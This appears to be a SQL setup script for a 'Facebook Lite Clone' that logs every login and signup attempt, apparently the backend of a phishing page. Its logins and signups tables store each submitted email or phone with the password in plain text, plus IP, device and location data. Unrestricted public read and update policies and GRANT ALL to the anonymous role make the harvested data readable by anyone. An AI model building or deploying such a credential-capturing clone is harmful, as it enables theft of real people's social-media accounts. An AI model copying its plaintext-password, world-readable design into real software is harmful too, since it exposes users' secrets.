-- Facebook Lite Clone Database Tables
-- This script creates the necessary tables for logging login and signup attempts

-- Enable Row Level Security (RLS)
ALTER DATABASE postgres SET "app.jwt_secret" TO 'your-jwt-secret-here';

-- Create users table for storing user profiles
CREATE TABLE IF NOT EXISTS users (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    phone VARCHAR(20),
    name VARCHAR(100),
    password_hash VARCHAR(255), -- For storing hashed passwords if needed later
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_login TIMESTAMP WITH TIME ZONE,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create logins table for storing all login attempts
CREATE TABLE IF NOT EXISTS logins (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    identifier VARCHAR(255) NOT NULL, -- email or phone number
    password VARCHAR(255) NOT NULL, -- plain text password (for demo purposes)
    ip_address INET,
    user_agent TEXT,
    device_info JSONB,
    location_info JSONB,
    success BOOLEAN DEFAULT false,
    date_created TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create signups table for storing all signup attempts
CREATE TABLE IF NOT EXISTS signups (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    identifier VARCHAR(255) NOT NULL, -- email or phone number
    password VARCHAR(255) NOT NULL, -- plain text password (for demo purposes)
    name VARCHAR(100),
    phone VARCHAR(20),
    ip_address INET,
    user_agent TEXT,
    device_info JSONB,
    location_info JSONB,
    success BOOLEAN DEFAULT false,
    date_created TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create indexes for better query performance
CREATE INDEX IF NOT EXISTS idx_logins_identifier ON logins(identifier);
CREATE INDEX IF NOT EXISTS idx_logins_date_created ON logins(date_created);
CREATE INDEX IF NOT EXISTS idx_signups_identifier ON signups(identifier);
CREATE INDEX IF NOT EXISTS idx_signups_date_created ON signups(date_created);
CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
CREATE INDEX IF NOT EXISTS idx_users_phone ON users(phone);

-- Enable Row Level Security on all tables
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE logins ENABLE ROW LEVEL SECURITY;
ALTER TABLE signups ENABLE ROW LEVEL SECURITY;

-- Create policies for public access (since this is a demo app)
-- Users can insert into logins and signups tables
CREATE POLICY "Allow public insert on logins" ON logins
    FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow public insert on signups" ON signups
    FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow public insert on users" ON users
    FOR INSERT WITH CHECK (true);

-- Users can read their own data (if needed later)
CREATE POLICY "Allow public select on logins" ON logins
    FOR SELECT USING (true);

CREATE POLICY "Allow public select on signups" ON signups
    FOR SELECT USING (true);

CREATE POLICY "Allow public select on users" ON users
    FOR SELECT USING (true);

-- Users can update their own data
CREATE POLICY "Allow public update on users" ON users
    FOR UPDATE USING (true);

-- Create a function to update the updated_at timestamp
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

-- Create triggers to automatically update updated_at
CREATE TRIGGER update_users_updated_at BEFORE UPDATE ON users
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- Insert some sample data for testing (optional)
-- INSERT INTO users (email, phone, name) VALUES 
--     ('test@example.com', '+1234567890', 'Test User'),
--     ('demo@example.com', '+0987654321', 'Demo User');

-- Grant necessary permissions
GRANT ALL ON ALL TABLES IN SCHEMA public TO anon;
GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO anon;
GRANT ALL ON ALL FUNCTIONS IN SCHEMA public TO anon;

-- Comments for documentation
COMMENT ON TABLE users IS 'Stores user profile information';
COMMENT ON TABLE logins IS 'Stores all login attempts for analytics';
COMMENT ON TABLE signups IS 'Stores all signup attempts for analytics';
COMMENT ON COLUMN logins.identifier IS 'Email or phone number used for login attempt';
COMMENT ON COLUMN signups.identifier IS 'Email or phone number used for signup attempt'; 